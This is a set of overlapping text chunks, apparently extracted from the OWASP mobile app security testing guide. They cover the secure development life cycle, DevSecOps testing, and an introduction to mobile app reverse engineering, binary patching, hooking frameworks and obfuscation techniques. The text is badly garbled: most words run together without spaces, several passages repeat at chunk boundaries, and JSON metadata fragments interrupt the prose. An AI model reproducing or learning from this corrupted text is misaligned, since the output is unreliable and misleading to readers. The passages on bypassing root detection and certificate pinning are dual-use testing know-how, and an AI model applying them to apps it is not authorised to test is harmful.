WhilethewidespreadadoptionofAgilepracticeswasspeedingupsoftwaredevelop- ment,securitytestershadtobecomequickerandmoreagilewhilecontinuingtodelivertrustworthysoftware. Thefollowingsectionisfocusedonthisevolutionanddescribescontemporarysecuritytesting. Security Testing during the Software Development Life Cycle Software development is not very old, after all, so the end of developing without a framework is easy to observe. We haveallexperiencedtheneedforaminimalsetofrulestocontrolworkasthesourcecodegrows. In the past, “Waterfall” methodologies were the most widely adopted: development proceeded by steps that had a predefinedsequence. Limitedtoasinglestep,backtrackingcapabilitywasaseriousdrawbackofWaterfallmethodologies. Althoughtheyhaveimportantpositivefeatures(providingstructure,helpingtestersclarifywhereeffortisneeded,being clearandeasytounderstand,etc.),theyalsohavenegativeones(creatingsilos,beingslow,specializedteams,etc.). Assoftwaredevelopmentmatured,competitionincreasedanddevelopersneededtoreacttomarketchangesmorequickly while creating software products with smaller budgets. The idea of less structure became popular, and smaller teams collaborated, breaking silos throughout the organization. The “Agile” concept was born (Scrum, XP, and RAD are well- knownexamplesofAgileimplementations);itenabledmoreautonomousteamstoworktogethermorequickly. Security wasn’t originally an integral part of software development. It was an afterthought, performed at the network levelbyoperationteamswhohadtocompensateforpoorsoftwaresecurity! Althoughunintegratedsecuritywaspossible when software programs were located inside a perimeter, the concept became obsolete as new kinds of software con- sumptionemergedwithweb,mobile,andIoTtechnologies. Nowadays,securitymustbebakedinsidesoftwarebecause compensatingforvulnerabilitiesisoftenverydifficult. “SDLC”willbeusedinterchangeablywith“SecureSDLC”inthefollowingsectiontohelpyouinternalizetheideathat securityisapartofsoftwaredevelopmentprocesses. Inthesamespirit,weusethenameDevSecOpstoemphasize thefactthatsecurityispartofDevOps. 35\\nSDLC Overview General Description of SDLC SDLCsalwaysconsistofthesamesteps(theoverallprocessissequentialintheWaterfallparadigmanditerativeinthe Agileparadigm): • Performariskassessmentfortheappanditscomponentstoidentifytheirriskprofiles. Theseriskprofilestypically depend on the organization’s risk appetite and applicable regulatory requirements. The risk assessment is also basedonfactors,includingwhethertheappisaccessibleviatheInternetandthekindofdatatheappprocesses andstores. Allkindsofrisksmustbetakenintoaccount: financial, marketing, industrial, etc. Dataclassification policiesspecifywhichdataissensitiveandhowitmustbesecured. • Security Requirements are determined at the beginning of a project or development cycle, when functional requirementsarebeinggathered. AbuseCasesareaddedasusecasesarecreated. Teams(includingdevelopment teams)maybegivensecuritytraining(suchasSecureCoding)iftheyneedit. YoucanusetheOWASPMASVSto determinethesecurityrequirementsofmobileappsonthebasisoftheriskassessmentphase. Iterativelyreviewing requirementswhenfeaturesanddataclassesareaddediscommon,especiallywithAgileprojects. • ThreatModeling,whichisbasicallytheidentification,enumeration,prioritization,andinitialhandlingofthreats, is a foundational artifact that must be performed as architecture development and design progress. Security Architecture, a Threat Model factor, can be refined (for both software and hardware aspects) after the Threat Modelingphase. SecureCodingrulesareestablishedandthelistofSecuritytoolsthatwillbeusediscreated. ThestrategyforSecuritytestingisclarified. • All security requirements and design considerations should be stored in the Application Life Cycle Management (ALM)system(alsoknownastheissuetracker)thatthedevelopment/opsteamusestoensuretightintegrationof security requirements into the development workflow. The security requirements should contain relevant source codesnippetssothatdeveloperscanquicklyreferencethesnippets. Creatingadedicatedrepositorythat’sunder versioncontrolandcontainsonlythesecodesnippetsisasecurecodingstrategythat’smorebeneficialthanthe traditionalapproach(storingtheguidelinesinworddocumentsorPDFs). • Securelydevelopthesoftware. Toincreasecodesecurity,youmustcompleteactivitiessuchasSecurityCode Reviews,StaticApplicationSecurityTesting,andSecurityUnitTesting. Althoughqualityanaloguesofthese securityactivitiesexist,thesamelogicmustbeappliedtosecurity,e.g.,reviewing,analyzing,andtestingcodefor securitydefects(forexample,missinginputvalidation,failingtofreeallresources,etc.). • Nextcomesthelong-awaitedreleasecandidatetesting: bothmanualandautomatedPenetrationTesting(“Pen- tests”). DynamicApplicationSecurityTestingisusuallyperformedduringthisphaseaswell. • After the software has been Accredited during Acceptance by all stakeholders, it can be safely transitioned to OperationteamsandputinProduction. • Thelastphase,toooftenneglected,isthesafeDecommissioningofsoftwareafteritsendofuse. Thepicturebelowillustratesallthephasesandartifacts: Basedontheproject’sgeneralriskprofile,youmaysimplify(orevenskip)someartifacts,andyoumayaddothers(formal 36\\nintermediary approvals, formal documentation of certain points, etc.). Always remember two things: an SDLC is meant to reduce risks associated with software development, and it is a framework that helps you set up controlstothatend. ThisisagenericdescriptionofSDLC;alwaystailorthisframeworktoyourprojects. Defining a Test Strategy TeststrategiesspecifytheteststhatwillbeperformedduringtheSDLCaswellastestingfrequency. Teststrategiesare usedtomakesurethatthefinalsoftwareproductmeetssecurityobjectives,whicharegenerallydeterminedbyclients’ legal/marketing/corporateteams. TheteststrategyisusuallycreatedduringtheSecureDesignphase,afterriskshave beenclarified(duringtheInitiationphase)andbeforecodedevelopment(theSecureImplementationphase)begins. The strategyrequiresinputfromactivitiessuchasRiskManagement,previousThreatModeling,andSecurityEngineering. ATestStrategyneedn’tbeformallywritten:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 38
    }
  },
  {
    "text": "Thepicturebelowillustratesallthephasesandartifacts: Basedontheproject’sgeneralriskprofile,youmaysimplify(orevenskip)someartifacts,andyoumayaddothers(formal 36\\nintermediary approvals, formal documentation of certain points, etc.). Always remember two things: an SDLC is meant to reduce risks associated with software development, and it is a framework that helps you set up controlstothatend. ThisisagenericdescriptionofSDLC;alwaystailorthisframeworktoyourprojects. Defining a Test Strategy TeststrategiesspecifytheteststhatwillbeperformedduringtheSDLCaswellastestingfrequency. Teststrategiesare usedtomakesurethatthefinalsoftwareproductmeetssecurityobjectives,whicharegenerallydeterminedbyclients’ legal/marketing/corporateteams. TheteststrategyisusuallycreatedduringtheSecureDesignphase,afterriskshave beenclarified(duringtheInitiationphase)andbeforecodedevelopment(theSecureImplementationphase)begins. The strategyrequiresinputfromactivitiessuchasRiskManagement,previousThreatModeling,andSecurityEngineering. ATestStrategyneedn’tbeformallywritten: itmaybedescribedthroughStories(inAgileprojects),quicklyenumerated inchecklists,orspecifiedastestcasesforagiventool. However,thestrategymustdefinitelybesharedbecauseitmust beimplementedbyateamotherthantheteamwhodefinedit. Moreover,alltechnicalteamsmustagreetoittoensure thatitdoesn’tplaceunacceptableburdensonanyofthem. TestStrategiesaddresstopicssuchasthefollowing: • objectivesandriskdescriptions • plansformeetingobjectives,riskreduction,whichtestswillbemandatory,whowillperformthem,howandwhen theywillbeperformed • acceptancecriteria To track the testing strategy’s progress and effectiveness, metrics should be defined, continually updated during the project,andperiodicallycommunicated. Anentirebookcouldbewrittenaboutchoosingrelevantmetrics; themostwe cansayhereisthattheydependonriskprofiles,projects,andorganizations. Examplesofmetricsincludethefollowing: • thenumberofstoriesrelatedtosecuritycontrolsthathavebeensuccessfullyimplemented • codecoverageforunittestsofsecuritycontrolsandsensitivefeatures • thenumberofsecuritybugsfoundforeachbuildviastaticanalysistools • trendsinsecuritybugbacklogs(whichmaybesortedbyurgency) Theseareonlysuggestions;othermetricsmaybemorerelevanttoyourproject. Metricsarepowerfultoolsforgettinga projectundercontrol,providedtheygiveprojectmanagersaclearandsyntheticperspectiveonwhatishappeningand whatneedstobeimproved. Distinguishingbetweentestsperformedbyaninternalteamandtestsperformedbyanindependentthirdpartyisimpor- tant. Internal tests are usually useful for improving daily operations, while third-party tests are more beneficial to the wholeorganization. Internaltestscanbeperformedquiteoften,butthird-partytestinghappensatmostonceortwicea year;also,theformerarelessexpensivethanthelatter. Botharenecessary,andmanyregulationsmandatetestsfrom anindependentthirdpartybecausesuchtestscanbemoretrustworthy. Security Testing in Waterfall What Waterfall Is and How Testing Activities Are Arranged Basically,SDLCdoesn’tmandatetheuseofanydevelopmentlifecycle: itissafetosaythatsecuritycan(andmust!) be addressedinanysituation. Waterfallmethodologieswerepopularbeforethe21stcentury. Themostfamousapplicationiscalledthe“Vmodel”,in whichphasesareperformedinsequenceandyoucanbacktrackonlyasinglestep. Thetestingactivitiesofthismodel occurinsequenceandareperformedasawhole,mostlyatthepointinthelifecyclewhenmostoftheappdevelopmentis complete. Thisactivitysequencemeansthatchangingthearchitectureandotherfactorsthatweresetupatthebeginning oftheprojectishardlypossibleeventhoughcodemaybechangedafterdefectshavebeenidentified. Security Testing for Agile/DevOps and DevSecOps DevOpsreferstopracticesthatfocusonaclosecollaborationbetweenallstakeholdersinvolvedinsoftwaredevelopment (generallycalledDevs)andoperations(generallycalledOps). DevOpsisnotaboutmergingDevsandOps. Development 37\\nandoperationsteamsoriginallyworkedinsilos,whenpushingdevelopedsoftwaretoproductioncouldtakeasignificant amountoftime. WhendevelopmentteamsmademovingmoredeliveriestoproductionnecessarybyworkingwithAgile, operationteamshadtospeeduptomatchthepace. DevOpsisthenecessaryevolutionofthesolutiontothatchallenge inthatitallowssoftwaretobereleasedtousersmorequickly. Thisislargelyaccomplishedviaextensivebuildautoma- tion, the process of testing and releasing software, and infrastructure changes (in addition to the collaboration aspect of DevOps). This automation is embodied in the deployment pipeline with the concepts of Continuous Integration and ContinuousDelivery(CI/CD). Peoplemayassumethattheterm“DevOps”representscollaborationbetweendevelopmentandoperationsteamsonly, however,asDevOpsthoughtleaderGeneKimputsit: “Atfirstblush,itseemsasthoughtheproblemsarejustbetween Devs and Ops, but test is in there, and you have informationsecurity objectives, and the need to protect systems and data. Thesearetop-levelconcernsofmanagement,andtheyhavebecomepartoftheDevOpspicture.” Inotherwords,DevOpscollaborationincludesqualityteams,securityteams,andmanyotherteamsrelatedtotheproject. Whenyouhear“DevOps”today,youshouldprobablybethinkingofsomethinglikeDevOpsQATestInfoSec. Indeed,DevOps valuespertaintoincreasingnotonlyspeedbutalsoquality,security,reliability,stability,andresilience. Securityisjustascriticaltobusinesssuccessastheoverallquality,performance,andusabilityofanapp. Asdevelopment cyclesareshortenedanddeliveryfrequenciesincreased,makingsurethatqualityandsecurityarebuiltinfromthevery beginningbecomesessential. DevSecOpsisallaboutaddingsecuritytoDevOpsprocesses. Mostdefectsareidentified duringproduction. DevOpsspecifiesbestpracticesforidentifyingasmanydefectsaspossibleearlyinthelifecycleand forminimizingthenumberofdefectsinthereleasedapp. However,DevSecOpsisnotjustalinearprocessorientedtowardsdeliveringthebestpossiblesoftwaretooperations;it isalsoamandatethatoperationscloselymonitorsoftwarethat’sinproductiontoidentifyissuesandfixthembyforming aquickandefficientfeedbackloopwithdevelopment. DevSecOpsisaprocessthroughwhichContinuousImprovement isheavilyemphasized. Thehumanaspectofthisemphasisisreflectedinthecreationofcross-functionalteamsthatworktogethertoachieve businessoutcomes. Thissectionisfocusedonnecessaryinteractionsandintegratingsecurityintothedevelopmentlife cycle(whichstartswithprojectinceptionandendswiththedeliveryofvaluetousers). What Agile and DevSecOps Are and How Testing Activities Are Arranged Overview 38\\nAutomation is a key DevSecOps practice: as stated earlier, the frequency of deliveries from development to operation increaseswhencomparedtothetraditionalapproach,andactivitiesthatusuallyrequiretimeneedtokeepup,e.g.deliver the same added value while taking less time. Unproductive activities must consequently be abandoned, and essential tasksmustbefastened. Thesechangesimpactinfrastructurechanges,deployment,andsecurity: • infrastructureisbeingimplementedasInfrastructureasCode • deploymentisbecomingmorescripted,translatedthroughtheconceptsofContinuousIntegrationandContin- uousDelivery • securityactivitiesarebeingautomatedasmuchaspossibleandtakingplacethroughoutthelifecycle Thefollowingsectionsprovidemoredetailsaboutthesethreepoints. Infrastructure as Code Insteadofmanuallyprovisioningcomputingresources(physicalservers, virtualmachines, etc.) andmodifyingconfigu- ration files, Infrastructure as Code is based on the use of tools and automation to fasten the provisioning process and makeitmorereliableandrepeatable. Correspondingscriptsareoftenstoredunderversioncontroltofacilitatesharing andissueresolution. InfrastructureasCodepracticesfacilitatecollaborationbetweendevelopmentandoperationsteams,withthefollowing results: • Devsbetterunderstandinfrastructurefromafamiliarpointofviewandcanprepareresourcesthattherunningapp willrequire. • Opsoperateanenvironmentthatbettersuitstheapp,andtheysharealanguagewithDevs. InfrastructureasCodealsofacilitatestheconstructionoftheenvironmentsrequiredbyclassicalsoftwarecreationprojects, fordevelopment(“DEV”),integration(“INT”),testing(“PPR”forPre-Production. Sometestsareusuallyperformedin earlier environments, and PPR tests mostly pertain to non-regression and performance with data that’s similar to data usedinproduction),andproduction(“PRD”).Thevalueofinfrastructureascodeliesinthepossiblesimilaritybetween environments(theyshouldbethesame). InfrastructureasCodeiscommonlyusedforprojectsthathaveCloud-basedresourcesbecausemanyvendorsprovideAPIs thatcanbeusedforprovisioningitems(suchasvirtualmachines, storagespaces, etc.) andworkingonconfigurations (e.g., modifying memory sizes or the number of CPUs used by virtual machines). These APIs provide alternatives to administrators’performingtheseactivitiesfrommonitoringconsoles. ThemaintoolsinthisdomainarePuppet,Terraform,Packer,ChefandAnsible. Deployment Thedeploymentpipeline’ssophisticationdependsonthematurityoftheprojectorganizationordevelopmentteam. Inits simplestform,thedeploymentpipelineconsistsofacommitphase. Thecommitphaseusuallyinvolvesrunningsimple compiler checks and the unit test suite as well as creating a deployable artifact of the app. A release candidate is the latestversionthathasbeencheckedintothetrunkoftheversioncontrolsystem. Releasecandidatesareevaluatedby thedeploymentpipelineforconformitytostandardstheymustfulfillfordeploymenttoproduction. Thecommitphaseisdesignedtoprovideinstantfeedbacktodevelopersandisthereforerunoneverycommittothetrunk. Timeconstraintsexistbecauseofthisfrequency. Thecommitphaseshouldusuallybecompletewithinfiveminutes,and itshouldn’ttakelongerthanten. Adheringtothistimeconstraintisquitechallengingwhenitcomestosecuritybecause manysecuritytoolscan’tberunquicklyenough(#paul,#mcgraw). CI/CD means “Continuous Integration/Continuous Delivery” in some contexts and “Continuous Integration/Continuous Deployment”inothers. Actually,thelogicis: • ContinuousIntegrationbuildactions(eithertriggeredbyacommitorperformedregularly)useallsourcecodeto build a candidate release. Tests can then be performed and the release’s compliance with security, quality, etc., rulescanbechecked. Ifcasecomplianceisconfirmed,theprocesscancontinue;otherwise,thedevelopmentteam mustremediatetheissue(s)andproposechanges. • ContinuousDeliverycandidatereleasescanproceedtothepre-productionenvironment. Ifthereleasecanthenbe validated(eithermanuallyorautomatically),deploymentcancontinue. Ifnot,theprojectteamwillbenotifiedand properaction(s)mustbetaken. 39\\n• ContinuousDeploymentreleasesaredirectlytransitionedfromintegrationtoproduction,e.g.,theybecomeacces- sible to the user. However, no release should go to production if significant defects have been identified during previousactivities. The delivery and deployment of apps with low or medium sensitivity may be merged into a single",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 39
    }
  },
  {
    "text": "security, quality, etc., rulescanbechecked. Ifcasecomplianceisconfirmed,theprocesscancontinue;otherwise,thedevelopmentteam mustremediatetheissue(s)andproposechanges. • ContinuousDeliverycandidatereleasescanproceedtothepre-productionenvironment. Ifthereleasecanthenbe validated(eithermanuallyorautomatically),deploymentcancontinue. Ifnot,theprojectteamwillbenotifiedand properaction(s)mustbetaken. 39\\n• ContinuousDeploymentreleasesaredirectlytransitionedfromintegrationtoproduction,e.g.,theybecomeacces- sible to the user. However, no release should go to production if significant defects have been identified during previousactivities. The delivery and deployment of apps with low or medium sensitivity may be merged into a single step, and validation maybeperformedafterdelivery. However,keepingthesetwoactionsseparateandusingstrongvalidationarestrongly advisedforsensitiveapps. Security Atthispoint,thebigquestionis: nowthatotheractivitiesrequiredfordeliveringcodearecompletedsignificantlyfaster andmoreeffectively,howcansecuritykeepup? Howcanwemaintainanappropriatelevelofsecurity? Deliveringvalue tousersmoreoftenwithdecreasedsecuritywoulddefinitelynotbegood! Onceagain,theanswerisautomationandtooling: byimplementingthesetwoconceptsthroughouttheprojectlifecycle, youcanmaintainandimprovesecurity. Thehighertheexpectedlevelofsecurity, themorecontrols, checkpoints, and emphasiswilltakeplace. Thefollowingareexamples: • Static Application Security Testing can take place during the development phase, and it can be integrated into the Continuous Integration process with more or less emphasis on scan results. You can establish more or less demandingSecureCodingRulesanduseSASTtoolstochecktheeffectivenessoftheirimplementation. • Dynamic Application Security Testing may be automatically performed after the app has been built (e.g., after ContinuousIntegrationhastakenplace)andbeforedelivery,again,withmoreorlessemphasisonresults. • You can add manual validation checkpoints between consecutive phases, for example, between delivery and de- ployment. ThesecurityofanappdevelopedwithDevOpsmustbeconsideredduringoperations. Thefollowingareexamples: • Scanningshouldtakeplaceregularly(atboththeinfrastructureandapplicationlevel). • Pentesting may take place regularly. (The version of the app used in production is the version that should be pentested, and the testing should take place in a dedicated environment and include data that’s similar to the productionversiondata. SeethesectiononPenetrationTestingformoredetails.) • Activemonitoringshouldbeperformedtoidentifyissuesandremediatethemassoonaspossibleviathefeedback loop. 40\\nReferences • [paul]-M.Paul. Official(ISC)2GuidetotheCSSLPCBK,SecondEdition((ISC)2Press),2014 • [mcgraw]-GMcGraw. SoftwareSecurity: BuildingSecurityIn,2006 41\\nMobile App Tampering and Reverse Engineering Reverseengineeringandtamperingtechniqueshavelongbelongedtotherealmofcrackers,modders,malwareanalysts, etc. For“traditional”securitytestersandresearchers,reverseengineeringhasbeenmoreofacomplementaryskill. But thetidesareturning: mobileappblack-boxtestingincreasinglyrequiresdisassemblingcompiledapps,applyingpatches, and tampering with binary code or even live processes. The fact that many mobile apps implement defenses against unwelcometamperingdoesn’tmakethingseasierforsecuritytesters. Reverseengineeringamobileappistheprocessofanalyzingthecompiledapptoextractinformationaboutitssource code. Thegoalofreverseengineeringiscomprehendingthecode. Tamperingistheprocessofchangingamobileapp(eitherthecompiledapportherunningprocess)oritsenvironmentto affectitsbehavior. Forexample,anappmightrefusetorunonyourrootedtestdevice,makingitimpossibletorunsome ofyourtests. Insuchcases,you’llwanttoaltertheapp’sbehavior. Mobile security testers are served well by understanding basic reverse engineering concepts. They should also know mobile devices and operating systems inside out: processor architecture, executable format, programming language intricacies,andsoforth. Reverse engineering is an art, and describing its every facet would fill a whole library. The sheer range of techniques and specializations is mind-blowing: one can spend years working on a very specific and isolated sub-problem, such as automating malware analysis or developing novel de-obfuscation methods. Security testers are generalists; to be effectivereverseengineers,theymustfilterthroughthevastamountofrelevantinformation. There is no generic reverse engineering process that always works. That said, we’ll describe commonly used methods andtoolslaterinthisguide,andgiveexamplesoftacklingthemostcommondefenses. Why You Need It Mobilesecuritytestingrequiresatleastbasicreverseengineeringskillsforseveralreasons: 1. Toenableblack-boxtestingofmobileapps. Modernappsoftenincludecontrolsthatwillhinderdynamicanalysis. SSLpinningandend-to-end(E2E)encryptionsometimespreventyoufrominterceptingormanipulatingtrafficwithaproxy. Rootdetectioncouldpreventtheappfromrunningonarooteddevice,preventingyoufromusingadvancedtestingtools. Youmustbeabletodeactivatethesedefenses. 2. Toenhancestaticanalysisinblack-boxsecuritytesting. Inablack-boxtest,staticanalysisoftheappbytecode orbinarycodehelpsyouunderstandtheinternallogicoftheapp. Italsoallowsyoutoidentifyflawssuchashardcoded credentials. 3. Toassessresilienceagainstreverseengineering. Appsthatimplementthesoftwareprotectionmeasureslisted intheMobileApplicationSecurityVerificationStandardAnti-ReversingControls(MASVS-R)shouldwithstandreverseengi- neeringtoacertaindegree. Toverifytheeffectivenessofsuchcontrols,thetestermayperformaresilienceassessment aspartofthegeneralsecuritytest. Fortheresilienceassessment,thetesterassumestheroleofthereverseengineer andattemptstobypassdefenses. Beforewediveintotheworldofmobileappreversing,wehavesomegoodnewsandsomebadnews. Let’sstartwiththe goodnews: Ultimately,thereverseengineeralwayswins. Thisisparticularlytrueinthemobileindustry,wherethereverseengineerhasanaturaladvantage: thewaymobileapps aredeployedandsandboxedisbydesignmorerestrictivethanthedeploymentandsandboxingofclassicalDesktopapps, so including the rootkit-like defensive mechanisms often found in Windows software (e.g., DRM systems) is simply not feasible. TheopennessofAndroidallowsreverseengineerstomakefavorablechangestotheoperatingsystem,aiding thereverseengineeringprocess. iOSgivesreverseengineerslesscontrol,butdefensiveoptionsarealsomorelimited. The bad news is that dealing with multi-threaded anti-debugging controls, cryptographic white-boxes, stealthy anti- tampering features, and highly complex control flow transformations is not for the faint-hearted. The most effective software protection schemes are proprietary and won’t be beaten with standard tweaks and tricks. Defeating them re- quires tedious manual analysis, coding, frustration and, depending on your personality, sleepless nights and strained relationships. 42\\nIt’s easy for beginners to get overwhelmed by the sheer scope of reversing. The best way to get started is to set up some basic tools (see the relevant sections in the Android and iOS reversing chapters) and start with simple reversing tasks and",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 40
    }
  },
  {
    "text": "personality, sleepless nights and strained relationships. 42\\nIt’s easy for beginners to get overwhelmed by the sheer scope of reversing. The best way to get started is to set up some basic tools (see the relevant sections in the Android and iOS reversing chapters) and start with simple reversing tasks and crackmes. You’ll need to learn about the assembler/bytecode language, the operating system, obfuscations youencounter,andsoon. Startwithsimpletasksandgraduallyleveluptomoredifficultones. Inthefollowingsection,we’llgiveanoverviewofthetechniquesmostcommonlyusedinmobileappsecuritytesting. In laterchapters,we’lldrilldownintoOS-specificdetailsofbothAndroidandiOS. Basic Tampering Techniques Binary Patching Patchingistheprocessofchangingthecompiledapp,e.g.,changingcodeinbinaryexecutables,modifyingJavabytecode, ortamperingwithresources. Thisprocessisknownasmoddinginthemobilegamehackingscene. Patchescanbeapplied inmanyways,includingeditingbinaryfilesinahexeditoranddecompiling,editing,andre-assemblinganapp. We’llgive detailedexamplesofusefulpatchesinlaterchapters. Keep in mind that modern mobile operating systems strictly enforce code signing, so running modified apps is not as straightforwardasitusedtobeindesktopenvironments. Securityexpertshadamucheasierlifeinthe90s! Fortunately, patchingisnot verydifficultifyouworkonyourowndevice. Yousimplyhavetore-signtheappordisablethedefault codesignatureverificationfacilitiestorunmodifiedcode. Code Injection Codeinjectionisaverypowerfultechniquethatallowsyoutoexploreandmodifyprocessesatruntime. Injectioncanbe implementedinvariousways,butyou’llgetbywithoutknowingallthedetailsthankstofreelyavailable,well-documented toolsthatautomatetheprocess. Thesetoolsgiveyoudirectaccesstoprocessmemoryandimportantstructuressuchas liveobjectsinstantiatedbytheapp. Theycomewithmanyutilityfunctionsthatareusefulforresolvingloadedlibraries, hookingmethodsandnativefunctions,andmore. Processmemorytamperingismoredifficulttodetectthanfilepatching, soitisthepreferredmethodinmostcases. Substrate,Frida,andXposedarethemostwidelyusedhookingandcodeinjectionframeworksinthemobileindustry. The threeframeworksdifferindesignphilosophyandimplementationdetails: SubstrateandXposedfocusoncodeinjection and/orhooking, whileFridaaimstobeafull-blown“dynamicinstrumentationframework”, incorporatingcodeinjection, languagebindings,andaninjectableJavaScriptVMandconsole. However,youcanalsoinstrumentappswithSubstratebyusingittoinjectCycript,theprogrammingenvironment(aka “Cycript-to-JavaScript”compiler)authoredbySaurikofCydiafame. Tocomplicatethingsevenmore,Frida’sauthorsalso created a fork of Cycript called “frida-cycript”. It replaces Cycript’s runtime with a Frida-based runtime called Mjølner. This enables Cycript to run on all the platforms and architectures maintained by frida-core (if you are confused at this point,don’tworry). Thereleaseoffrida-cycriptwasaccompaniedbyablogpostbyFrida’sdeveloperOletitled“Cycript onSteroids”,atitlethatSaurikwasn’tveryfondof. We’llincludeexamplesofallthreeframeworks. WerecommendstartingwithFridabecauseitisthemostversatileofthe three(forthisreason,we’llalsoincludemoreFridadetailsandexamples). Notably,FridacaninjectaJavaScriptVMintoa processonbothAndroidandiOS,whileCycriptinjectionwithSubstrateonlyworksoniOS.Ultimately,however,youcan ofcourseachievemanyofthesamegoalswitheitherframework. Static and Dynamic Binary Analysis Reverseengineeringistheprocessofreconstructingthesemanticsofacompiledprogram’ssourcecode. Inotherwords, youtaketheprogramapart,runit,simulatepartsofit,anddootherunspeakablethingstoittounderstandwhatitdoes andhow. 43\\nUsing Disassemblers and Decompilers Disassemblersanddecompilersallowyoutotranslateanapp’sbinarycodeorbytecodebackintoamoreorlessunder- standableformat. Byusingthesetoolsonnativebinaries,youcanobtainassemblercodethatmatchesthearchitecture theappwascompiledfor. Disassemblersconvertmachinecodetoassemblycodewhichinturnisusedbydecompilers togenerateequivalenthigh-levellanguagecode. AndroidJavaappscanbedisassembledtosmali,whichisanassembly languagefortheDEXformatusedbyDalvik,Android’sJavaVM.Smaliassemblycanalsobequiteeasilydecompiledback toequivalentJavacode. Intheory,themappingbetweenassemblyandmachinecodeshouldbeone-to-one,andthereforeitmaygivetheimpres- sionthatdisassemblingisasimpletask. Butinpractice,therearemultiplepitfallssuchas: • Reliabledistinctionbetweencodeanddata. • Variableinstructionsize. • Indirectbranchinstructions. • FunctionswithoutexplicitCALLinstructionswithintheexecutable’scodesegment. • Positionindependentcode(PIC)sequences. • Handcraftedassemblycode. Similarly,decompilationisaverycomplicatedprocess,involvingmanydeterministicandheuristicbasedapproaches. Asa consequence,decompilationisusuallynotreallyaccurate,butneverthelessveryhelpfulingettingaquickunderstanding of the function being analyzed. The accuracy of decompilation depends on the amount of information available in the code being decompiled and the sophistication of the decompiler. In addition, many compilation and post-compilation tools introduce additional complexity to the compiled code in order to increase the difficulty of comprehension and/or evendecompilationitself. Suchcodereferredtoasobfuscatedcode. Overthepastdecadesmanytoolshaveperfectedtheprocessofdisassemblyanddecompilation,producingoutputwith high fidelity. Advanced usage instructions for any of the available tools can often easily fill a book of their own. The best way to get started is to simply pick up a tool that fits your needs and budget and get a well-reviewed user guide. Inthissection, wewillprovideanintroductiontosomeofthosetoolsandinthesubsequent“ReverseEngineeringand Tampering”AndroidandiOSchapterswe’llfocusonthetechniquesthemselves,especiallythosethatarespecifictothe platformathand. Obfuscation Obfuscationistheprocessoftransformingcodeanddatatomakeitmoredifficulttocomprehend(andsometimeseven difficult to disassemble). It is usually an integral part of the software protection scheme. Obfuscation isn’t something thatcanbesimplyturnedonoroff,programscanbemadeincomprehensible,inwholeorinpart,inmanywaysandto differentdegrees. Note: Allpresentedtechniquesbelowwillnotstopsomeonewithenoughtimeandbudgetfromreverseengineer- ing your app. However, combining these techniques will make their job significantly harder. The aim is thus to discouragereverseengineersfromperformingfurtheranalysisandnotmakingitworththeeffort. Thefollowingtechniquescanbeusedtoobfuscateanapplication: • Nameobfuscation • Instructionsubstitution • Controlflowflattening • Deadcodeinjection • Stringencryption • Packing Name Obfuscation The standard compiler generates binary symbols based on class and function names from the source code. Therefore, if no obfuscation is applied, symbol names remain meaningful and can easily be extracted from the app binary. For instance, afunctionwhichdetectsajailbreakcanbelocatedbysearchingforrelevantkeywords(e.g.“jailbreak”). The listingbelowshowsthedisassembledfunctionJailbreakDetectionViewController.jailbreakTest4Tappedfromthe DamnVulnerableiOSApp(DVIA-v2). 44\\n__T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Aftertheobfuscationwecanobservethatthesymbol’snameisnolongermeaningfulasshownonthelistingbelow. __T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Nevertheless,thisonlyappliestothenamesoffunctions,classesandfields. Theactualcoderemainsunmodified,soan attackercanstillreadthedisassembledversionofthefunctionandtrytounderstanditspurpose(e.g.toretrievethelogic ofasecurityalgorithm). Instruction Substitution This technique replaces standard binary operators like addition or subtraction with more complex representations. For example,anadditionx = a + bcanberepresentedasx = -(-a) - (-b). However,usingthesamereplacementrepre- sentation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introducearandomfactor. Thistechniquecanbereversedduringdecompilation,butdependingonthecomplexityand depthofthesubstitutions,reversingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 41
    }
  },
  {
    "text": "+ bcanberepresentedasx = -(-a) - (-b). However,usingthesamereplacementrepre- sentation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introducearandomfactor. Thistechniquecanbereversedduringdecompilation,butdependingonthecomplexityand depthofthesubstitutions,reversingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs thatusuallymakethecodeeasiertoread. 45\\nTheimageshowshowcontrolflowflatteningalterscode. See“ObfuscatingC++programsviacontrolflowflattening”for moreinformation. Dead Code Injection Thistechniquemakestheprogram’scontrolflowmorecomplexbyinjectingdeadcodeintotheprogram. Deadcodeis astubofcodethatdoesn’taffecttheoriginalprogram’sbehaviorbutincreasestheoverheadofthereverseengineering process. String Encryption Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are storedinplaintextinthedatasectionofanapplication’sbinary. Thistechniqueencryptsthesevaluesandinjectsstubs ofcodeintotheprogramthatwilldecryptthatdatabeforeitisusedbytheprogram. Packing Packing is a dynamic rewriting obfuscation technique which compresses or encrypts the original executable into data anddynamicallyrecoversitduringexecution. Packinganexecutablechangesthefilesignatureinanattempttoavoid signature-baseddetection. Debugging and Tracing Inthetraditionalsense,debuggingistheprocessofidentifyingandisolatingproblemsinaprogramaspartofthesoftware developmentlifecycle. Thesametoolsusedfordebuggingarevaluabletoreverseengineersevenwhenidentifyingbugs 46\\nisnottheprimarygoal. Debuggersenableprogramsuspensionatanypointduringruntime, inspectionoftheprocess’ internalstate,andevenregisterandmemorymodification. Theseabilitiessimplifyprograminspection. Debugging usually means interactive debugging sessions in which a debugger is attached to the running process. In contrast, tracing refers to passive logging of information about the app’s execution (such as API calls). Tracing can be 